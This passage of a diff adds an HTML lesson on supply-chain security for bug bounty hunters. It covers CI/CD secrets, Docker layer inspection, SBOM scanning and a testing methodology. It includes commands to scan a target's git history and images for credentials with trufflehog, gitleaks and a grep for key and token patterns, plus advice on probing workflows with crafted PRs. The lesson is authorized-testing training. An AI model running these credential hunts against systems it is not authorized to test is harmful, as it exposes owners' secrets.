+                        the target's public repositories, search all .github/workflows/ files for
+                        dangerous patterns (pull_request_target, expression injection, unpinned actions),
+                        and test by forking the repo and opening a carefully crafted PR. Many high-profile
+                        repositories have vulnerable workflows that have never been reviewed.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 4: Secrets in CI/CD -->
+    <div class="section" id="section-4">
+        <div class="section-number">Section 04</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#9670;</span>
+            Secrets in CI/CD
+        </h2>
+        <div class="section-body">
+            <p>
+                CI/CD pipelines handle some of the most sensitive credentials in an organization:
+                deployment keys, API tokens, signing certificates, cloud provider credentials, and
+                database connection strings. These secrets are necessary for automated deployment but
+                create enormous risk when exposed. Finding exposed secrets in CI/CD configurations is
+                one of the most reliably high-impact bug bounty findings.
+            </p>
+
+            <h3 style="color: #c4a0d8; font-size: 1.1rem; margin: 28px 0 16px; font-weight: 400;">Where Secrets Hide</h3>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-title">Hardcoded in CI Configs</div>
+                    <div class="concept-card-body">
+                        Developers sometimes hardcode credentials directly in workflow files, Dockerfiles,
+                        or build scripts. These files are committed to version control and may be publicly
+                        visible. Even if the secret is later removed, it persists in git history.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-title">Exposed Environment Variables</div>
+                    <div class="concept-card-body">
+                        CI platforms inject secrets as environment variables. Debug logging, error messages,
+                        or misconfigured steps can print these variables to build logs. Public repositories
+                        with public build logs are particularly vulnerable.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-title">Build Log Artifacts</div>
+                    <div class="concept-card-body">
+                        Build logs may contain secrets that were accidentally printed, credentials embedded
+                        in URLs (git clone https://token@github.com/...), or debug output from tools
+                        that echo their configuration. Some CI platforms make build logs publicly accessible.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-title">Build Artifacts</div>
+                    <div class="concept-card-body">
+                        Compiled artifacts, Docker images, and deployment packages may contain embedded
+                        secrets. A .env file accidentally included in a Docker image, a config file
+                        with hardcoded credentials baked into a build artifact, or signing keys left
+                        in a release package.
+                    </div>
+                </div>
+            </div>
+
+            <h3 style="color: #c4a0d8; font-size: 1.1rem; margin: 28px 0 16px; font-weight: 400;">Secret Scanning Tools</h3>
+
+            <div class="tool-grid">
+                <div class="tool-card">
+                    <div class="tool-name">trufflehog</div>
+                    <div class="tool-role">Secret Detection</div>
+                    <div class="tool-desc">
+                        Scans git repositories, including full history, for high-entropy strings and
+                        known secret patterns. Supports regex-based detectors for AWS keys, GCP
+                        credentials, Slack tokens, and hundreds of other secret formats. Can verify
+                        whether discovered credentials are still active.
+                    </div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">gitleaks</div>
+                    <div class="tool-role">Secret Detection</div>
+                    <div class="tool-desc">
+                        Fast, regex-based secret scanner for git repos. Includes pre-commit hook support
+                        for prevention. Supports custom rules for organization-specific secret formats.
+                        Generates SARIF output for integration with GitHub Advanced Security.
+                    </div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">detect-secrets (Yelp)</div>
+                    <div class="tool-role">Secret Prevention</div>
+                    <div class="tool-desc">
+                        Yelp's enterprise secret detection framework. Uses a baseline model to track
+                        known secrets and alert only on new ones. Pluggable architecture with support
+                        for custom detectors. Designed for CI integration as a pre-commit check.
+                    </div>
+                </div>
+            </div>
+
+            <div class="code-block"><span class="comment"># Scanning for secrets in a target's public repositories</span>
+
+<span class="comment"># Full history scan with trufflehog</span>
+<span class="cmd">trufflehog</span> git https://github.com/target-org/target-repo <span class="flag">--only-verified</span>
+
+<span class="comment"># Scan with gitleaks</span>
+<span class="cmd">gitleaks</span> detect <span class="flag">--source</span> ./target-repo <span class="flag">-v</span>
+
+<span class="comment"># Search for common patterns manually</span>
+<span class="cmd">git</span> log <span class="flag">-p</span> | grep -iE <span class="str">'(api[_-]?key|secret|password|token|credential).*=.*[A-Za-z0-9+/]{20}'</span>
+
+<span class="comment"># Check build logs if publicly accessible</span>
+<span class="comment"># GitHub Actions: check the "Actions" tab on public repos</span>
+<span class="comment"># Look for debug output, env variable dumps, error messages with creds</span></div>
+
+            <div class="callout callout-info">
+                <div class="callout-icon">&#9432;</div>
+                <div>
+                    <div class="callout-title">Verification Matters</div>
+                    <div class="callout-text">
+                        Finding a string that looks like an API key is not enough. Verify that the
+                        credential is still active before reporting. Trufflehog's --only-verified flag
+                        does this automatically for many credential types. A report that says "I found
+                        an active AWS key with S3 read access to bucket X containing Y" is far more
+                        impactful than "I found a string that might be an API key." Never access data
+                        beyond what is needed to confirm the credential works.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 5: Container Image Poisoning -->
+    <div class="section" id="section-5">
+        <div class="section-number">Section 05</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#9670;</span>
+            Container Image Poisoning
+        </h2>
+        <div class="section-body">
+            <p>
+                Docker images are composed of layered filesystems. Each layer is immutable once created,
+                but the supply chain for building images introduces multiple attack vectors. From the
+                base image selection to the packages installed during the build process to the registry
+                where the final image is stored, every step can be compromised. Container image
+                poisoning is particularly insidious because the malicious content is baked into the
+                deployment artifact and runs in every environment that pulls the image.
+            </p>
+
+            <h3 style="color: #c4a0d8; font-size: 1.1rem; margin: 28px 0 16px; font-weight: 400;">Attack Vectors</h3>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3>Build-Time Attacks</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9656;</span> Compromised base images (FROM malicious-image)</li>
+                        <li><span class="li-marker">&#9656;</span> Malicious packages installed via RUN apt-get/pip/npm</li>
+                        <li><span class="li-marker">&#9656;</span> Secrets embedded in image layers (even deleted ones)</li>
+                        <li><span class="li-marker">&#9656;</span> Build-arg secrets captured in layer metadata</li>
+                        <li><span class="li-marker">&#9656;</span> Multi-stage build leaks (secrets in non-final stages)</li>
+                    </ul>
+                </div>
+                <div class="col-card">
+                    <h3>Registry Attacks</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9656;</span> Tag mutation (pushing new content to existing tag)</li>
+                        <li><span class="li-marker">&#9656;</span> Typosquatting popular image names</li>
+                        <li><span class="li-marker">&#9656;</span> Compromised registry credentials</li>
+                        <li><span class="li-marker">&#9656;</span> Man-in-the-middle during pull (unsigned images)</li>
+                        <li><span class="li-marker">&#9656;</span> Namespace confusion between Docker Hub and private registries</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="code-block"><span class="comment"># Dockerfile security review checklist</span>
+
+<span class="comment"># 1. Check base image source and pinning</span>
+<span class="kw">FROM</span> node:18-alpine              <span class="comment"># Tag-based: can be mutated</span>
+<span class="kw">FROM</span> node@sha256:abc123...        <span class="comment"># Digest-based: immutable (preferred)</span>
+
+<span class="comment"># 2. Check for secrets in build args</span>
+<span class="kw">ARG</span> API_KEY                        <span class="comment"># Captured in layer metadata!</span>
+<span class="kw">RUN</span> <span class="cmd">curl</span> <span class="flag">-H</span> <span class="str">"Auth: $API_KEY"</span> ...  <span class="comment"># Secret visible in image history</span>
+
+<span class="comment"># 3. Check for leftover secrets</span>
+<span class="kw">COPY</span> .env /app/.env               <span class="comment"># Secrets in image</span>
+<span class="kw">RUN</span> rm /app/.env                   <span class="comment"># Still in previous layer!</span>
+
+<span class="comment"># 4. Inspect existing images for secrets</span>
+<span class="cmd">docker</span> history <span class="flag">--no-trunc</span> target-image
+<span class="cmd">docker</span> save target-image | <span class="cmd">tar</span> <span class="flag">-xf</span> - <span class="comment"># Extract all layers</span>
+<span class="comment"># Then search each layer for secrets, credentials, config files</span></div>
+
+            <h3 style="color: #c4a0d8; font-size: 1.1rem; margin: 28px 0 16px; font-weight: 400;">Image Signing and Verification</h3>
+
+            <p>
+                Docker Content Trust (DCT) and Sigstore/cosign provide mechanisms for signing images
+                and verifying signatures before deployment. In practice, most organizations do not
+                enforce signature verification. When assessing a target, check whether their container
+                deployment pipeline verifies image signatures. If it does not, any compromise of the
+                registry or build pipeline results in undetected image tampering.
+            </p>
+
+            <div class="callout callout-warning">
+                <div class="callout-icon">&#9888;</div>
+                <div>
+                    <div class="callout-title">Layer Archaeology</div>
+                    <div class="callout-text">
+                        Docker images retain all layers, including those created by commands that later
+                        delete files. A developer who copies a .env file into the image, uses it during
+                        the build, and then deletes it has not removed the secret. The file exists in a
+                        previous layer. Always extract and examine all layers of a target's Docker images
+                        when they are publicly accessible. Secrets removed in later layers are a common
+                        and high-impact finding.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 6: SBOM & Package Analysis -->
+    <div class="section" id="section-6">
+        <div class="section-number">Section 06</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#9670;</span>
+            SBOM &amp; Package Analysis
+        </h2>
+        <div class="section-body">
+            <p>
+                A Software Bill of Materials (SBOM) is a complete inventory of every component in a
+                software application, including direct dependencies, transitive dependencies, their
+                versions, and their licenses. SBOMs have become a federal requirement for software sold
+                to the US government (Executive Order 14028) and are increasingly expected in enterprise
+                procurement. For bug bounty hunters, dependency analysis is a systematic way to find
+                known vulnerabilities that the target has not patched.
+            </p>
+
+            <h3 style="color: #c4a0d8; font-size: 1.1rem; margin: 28px 0 16px; font-weight: 400;">Dependency Tree Analysis</h3>
+
+            <div class="code-block"><span class="comment"># Generate and analyze dependency trees</span>
+
+<span class="comment"># npm: show full dependency tree</span>
+<span class="cmd">npm</span> ls <span class="flag">--all</span>
+
+<span class="comment"># Check for known vulnerabilities</span>
+<span class="cmd">npm</span> audit
+
+<span class="comment"># Python: show dependency tree</span>
+<span class="cmd">pip</span> install pipdeptree
+<span class="cmd">pipdeptree</span> <span class="flag">--warn</span> silence
+
+<span class="comment"># Generate SBOM in CycloneDX format</span>
+<span class="cmd">npx</span> @cyclonedx/cyclonedx-npm <span class="flag">--output-file</span> sbom.json
+
+<span class="comment"># Scan SBOM for known vulnerabilities</span>
+<span class="cmd">grype</span> sbom:sbom.json</div>
+
+            <h3 style="color: #c4a0d8; font-size: 1.1rem; margin: 28px 0 16px; font-weight: 400;">Vulnerability Scanning Tools</h3>
+
+            <div class="tool-grid">
+                <div class="tool-card">
+                    <div class="tool-name">Snyk</div>
+                    <div class="tool-role">Dependency Scanning</div>
+                    <div class="tool-desc">
+                        Commercial vulnerability scanner with a free tier. Scans dependencies, container
+                        images, and IaC configurations. Provides fix recommendations including specific
+                        upgrade paths. Integrates with CI/CD pipelines for continuous monitoring.
+                    </div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">Dependabot</div>
+                    <div class="tool-role">Automated Updates</div>
+                    <div class="tool-desc">
+                        GitHub's built-in dependency update service. Creates pull requests to update
+                        vulnerable dependencies. Check whether the target has Dependabot enabled and
+                        whether they merge its PRs. Unmerged Dependabot PRs indicate known-but-unpatched
+                        vulnerabilities.
+                    </div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">Grype</div>
+                    <div class="tool-role">Vulnerability Matching</div>
+                    <div class="tool-desc">
+                        Anchore's open-source vulnerability scanner. Scans container images and SBOMs
+                        against multiple vulnerability databases (NVD, GitHub Advisory, etc.). Fast,
+                        CLI-friendly, and integrates well with CI/CD pipelines.
+                    </div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">OSV-Scanner</div>
+                    <div class="tool-role">Open Source Vulnerability DB</div>
+                    <div class="tool-desc">
+                        Google's vulnerability scanner using the OSV database. Supports multiple
+                        ecosystems (npm, PyPI, Go, Maven). Particularly strong for open-source
+                        projects. Provides detailed vulnerability information with affected version
+                        ranges.
+                    </div>
+                </div>
+            </div>
+
+            <h3 style="color: #c4a0d8; font-size: 1.1rem; margin: 28px 0 16px; font-weight: 400;">Transitive Dependency Risks</h3>
+
+            <p>
+                The most dangerous dependencies are often the ones you never directly chose. Transitive
+                dependencies (dependencies of your dependencies) can be several levels deep. A typical
+                Node.js application with 20 direct dependencies might have 500+ transitive dependencies.
+                A vulnerability in any one of these affects the application, but developers rarely audit
+                beyond their direct dependencies.
+            </p>
+
+            <div class="callout callout-info">
+                <div class="callout-icon">&#9432;</div>
+                <div>
+                    <div class="callout-title">Bug Bounty Application</div>
+                    <div class="callout-text">
+                        When reporting dependency vulnerabilities through bug bounty programs, focus on
+                        impact. A vulnerable version of a library is only reportable if the vulnerable
+                        code path is actually reachable in the target's application. "Your package.json
+                        lists a vulnerable version of library X" is a low-quality report. "Your
+                        application uses function Y from library X version Z, which is vulnerable to
+                        CVE-XXXX, and I can trigger the vulnerable code path via endpoint /api/foo"
+                        is a quality report.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 7: Supply Chain Testing Methodology -->
+    <div class="section" id="section-7">
+        <div class="section-number">Section 07</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#9670;</span>
+            Supply Chain Testing Methodology
+        </h2>
+        <div class="section-body">
+            <p>
+                A systematic approach to supply chain security assessment covers the full pipeline from
+                source code through deployment. Each phase has specific targets, tools, and techniques.
+                The methodology presented here is designed for bug bounty hunters working within the
+                scope of authorized programs, focusing on findings that programs will accept and pay for.
+            </p>
+
+            <h3 style="color: #c4a0d8; font-size: 1.1rem; margin: 28px 0 16px; font-weight: 400;">Phase 1: Reconnaissance</h3>
+
+            <ul class="numbered-list">
+                <li>Identify the target's public repositories on GitHub, GitLab, and Bitbucket. Look for organization accounts, personal accounts of known employees, and repositories referenced in job postings or documentation.</li>
+                <li>Map the CI/CD infrastructure. Check for GitHub Actions workflows, .gitlab-ci.yml, Jenkinsfile, circleci/config.yml, and other CI configuration files. Note which platforms are in use and how workflows are structured.</li>
+                <li>Enumerate dependencies by examining package.json, requirements.txt, go.mod, Gemfile, pom.xml, and similar dependency manifests. Note the lock file presence and whether dependencies are pinned to exact versions.</li>
+                <li>Identify container registries. Check for Dockerfiles, docker-compose.yml, and Kubernetes manifests that reference specific registries. Note whether images are pulled by tag or by digest.</li>
+                <li>Look for internal package names. Search public code, documentation, error messages, and job postings for references to private packages. These are candidates for dependency confusion testing.</li>
+            </ul>
+
+            <h3 style="color: #c4a0d8; font-size: 1.1rem; margin: 28px 0 16px; font-weight: 400;">Phase 2: Analysis</h3>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-title">Workflow Security Review</div>
+                    <div class="concept-card-body">
+                        Review every GitHub Actions workflow for injection vulnerabilities, dangerous
+                        trigger events (pull_request_target), over-permissioned GITHUB_TOKEN, unpinned
+                        third-party actions, and secret exposure in logs. Each finding is a potential
+                        code execution or credential theft.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-title">Secret Archaeology</div>
+                    <div class="concept-card-body">
+                        Scan the full git history of all repositories with trufflehog and gitleaks.
+                        Check build logs for credential exposure. Examine Docker image layers for
+                        embedded secrets. Verify that any discovered credentials are still active
+                        before reporting.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-title">Dependency Audit</div>
+                    <div class="concept-card-body">
+                        Run vulnerability scanners against all dependency manifests. Focus on
+                        dependencies with known critical CVEs that have reachable code paths in the
+                        target application. Check for outdated dependencies that are no longer
+                        maintained.
+                    </div>
+                </div>
+            </div>
+
+            <h3 style="color: #c4a0d8; font-size: 1.1rem; margin: 28px 0 16px; font-weight: 400;">Phase 3: Reporting</h3>
+
+            <p>
+                Supply chain vulnerabilities require careful impact articulation. The severity depends
+                not just on what is exposed, but on what an attacker could do with it. A leaked
+                deployment key is high severity because it enables code execution in production. A
+                vulnerable development dependency is low severity if it only affects the local
+                development environment.
+            </p>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3>High-Impact Findings</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9656;</span> Active deployment credentials in git history</li>
+                        <li><span class="li-marker">&#9656;</span> GitHub Actions RCE via workflow injection</li>
+                        <li><span class="li-marker">&#9656;</span> Dependency confusion with successful callback</li>
+                        <li><span class="li-marker">&#9656;</span> Container images with embedded production secrets</li>
+                        <li><span class="li-marker">&#9656;</span> Pwn request workflows exposing repository secrets</li>
+                    </ul>
+                </div>
+                <div class="col-card">
+                    <h3>Lower-Impact Findings</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9656;</span> Expired or revoked credentials in git history</li>
+                        <li><span class="li-marker">&#9656;</span> Vulnerable development dependencies (devDependencies)</li>
+                        <li><span class="li-marker">&#9656;</span> Unpinned actions without demonstrated exploit path</li>
+                        <li><span class="li-marker">&#9656;</span> Informational SBOM gaps without CVE evidence</li>
+                        <li><span class="li-marker">&#9656;</span> Missing image signatures without demonstrated tamper</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="callout callout-tip">
+                <div class="callout-icon">&#10004;</div>
+                <div>
+                    <div class="callout-title">Scope Awareness</div>
+                    <div class="callout-text">
+                        Not all bug bounty programs include supply chain attacks in scope. Check the
+                        program policy carefully. Some programs explicitly exclude "social engineering
+                        of employees" which could be interpreted to cover dependency confusion. Others
+                        exclude "attacks requiring physical access" or "third-party software." When
+                        in doubt, ask the program before testing. A finding that is out of scope wastes
+                        your time and annoys the triage team.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Discussion -->
+    <div class="section" id="discuss">
+        <div class="discussion-section">
+            <div class="discussion-title">
+                <span>&#128172;</span>
+                Discussion Prompts
+            </div>
+            <ul class="prompt-list">
+                <li class="prompt-item">
+                    <span class="prompt-num">01</span>
+                    The xz Utils backdoor was inserted by someone who spent two years building trust as a maintainer. Open source projects depend on volunteer labor with minimal identity verification. How can the open source community balance the need for new contributors with the risk of malicious insiders? Should there be formal vetting processes for maintainers of critical infrastructure libraries?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">02</span>
+                    Dependency confusion attacks exploit a design choice in package managers: public registries take precedence over private ones in certain configurations. Should package managers change their default behavior to prefer private registries? What would break if they did? Is this a security bug or a feature that is being misused?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">03</span>
+                    Many organizations have thousands of dependencies and no process for auditing them. A federal SBOM requirement forces visibility but not action. Is knowing about your dependencies enough, or does meaningful supply chain security require fundamentally reducing the number of dependencies? What would software development look like if every dependency had to be explicitly justified and audited?
+                </li>
+                <li class="prompt-item">
+                    <span class="prompt-num">04</span>
+                    You discover that a target's GitHub Actions workflow is vulnerable to a pwn request attack that would expose their deployment keys. The vulnerability exists because they use a popular CI template that thousands of other organizations also use. Do you report only to the target, or do you also report to the template maintainer? How do you handle a vulnerability that affects thousands of organizations through a shared configuration pattern?
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Completion -->
+    <div class="section" id="completion">
+        <div class="completion-section">
+            <div class="completion-icon">&#10003;</div>
+            <h2 class="completion-title">Module Complete</h2>
+            <p class="completion-text">
+                You have covered the supply chain security landscape: the attack taxonomy from
+                dependencies to build systems to container infrastructure, dependency confusion and
+                typosquatting methodologies, GitHub Actions exploitation including workflow injection
+                and pwn requests, secret detection in CI/CD pipelines, container image security and
+                layer archaeology, SBOM analysis and vulnerability scanning, and a systematic
+                methodology for supply chain security testing. You are ready to hunt for supply chain
+                vulnerabilities in bug bounty programs.
+            </p>
+            <button class="completion-btn" onclick="completeModule()">
+                <span>&#10003;</span>
+                Complete Module 17
+            </button>
+        </div>
+    </div>
+
+</main>
+
+<script>
+    // Scroll progress bar
+    function updateScrollProgress() {
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+        const pct = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
+        document.getElementById('scrollProgress').style.width = pct + '%';
+        document.getElementById('readingFill').style.width = pct + '%';
+    }
+
+    window.addEventListener('scroll', updateScrollProgress, { passive: true });
+
+    // Section fade-in on scroll via IntersectionObserver
+    function initSectionAnimations() {
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) entry.target.classList.add('visible');
+            });
+        }, { threshold: 0.08 });
+
+        document.querySelectorAll('.section').forEach(s => observer.observe(s));
+    }
+
+    // Expandable detail sections
+    function toggleDetail(header) {
+        const body = header.nextElementSibling;
+        const toggle = header.querySelector('.detail-toggle');
+        const isOpen = body.classList.contains('open');
+        body.classList.toggle('open', !isOpen);
+        toggle.classList.toggle('open', !isOpen);
+    }
+
+    // Module completion
+    function completeModule() {
+        if (typeof ModuleProgress !== 'undefined') {
+            ModuleProgress.complete('dark-arts', 'bh-mod-supply-chain', {
+                returnUrl: '../index.html'
+            });
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        initSectionAnimations();
+    });
+</script>
+
+</body>
+</html>
